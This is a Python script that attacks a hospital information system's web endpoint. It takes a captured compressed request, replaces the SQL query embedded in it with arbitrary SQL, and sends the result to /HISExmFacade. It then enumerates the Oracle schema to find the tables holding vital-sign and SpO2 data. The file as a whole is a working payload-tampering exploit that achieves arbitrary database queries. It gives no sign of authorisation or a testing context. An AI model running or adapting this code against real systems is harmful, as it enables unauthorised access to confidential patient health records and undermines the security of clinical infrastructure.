from his_client_final import HISClient
import requests
import zlib
import re

class SchemaAngel(HISClient):
    def execute_sql(self, sql):
        #print(f"[*] Executing: {sql.strip()}")
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}). Cannot execute.")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

angel = SchemaAngel()

print("1. Find Owner of MDRVTSN")
res = angel.execute_sql("SELECT OWNER, TABLE_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'MDRVTSN'")
if res and "NewDataSet" in res:
     print(res[:2000])

print("\n2. Find Owner of VITALSIGN")
res = angel.execute_sql("SELECT OWNER, TABLE_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'VITALSIGN'")
if res and "NewDataSet" in res:
     print(res[:2000])

print("\n3. Find Owner of Tables with SPO2")
# Distinct tables with SPO2
res = angel.execute_sql("SELECT DISTINCT OWNER, TABLE_NAME FROM ALL_TAB_COLUMNS WHERE COLUMN_NAME LIKE '%SPO2%'")
if res and "NewDataSet" in res:
     print(res[:2000])
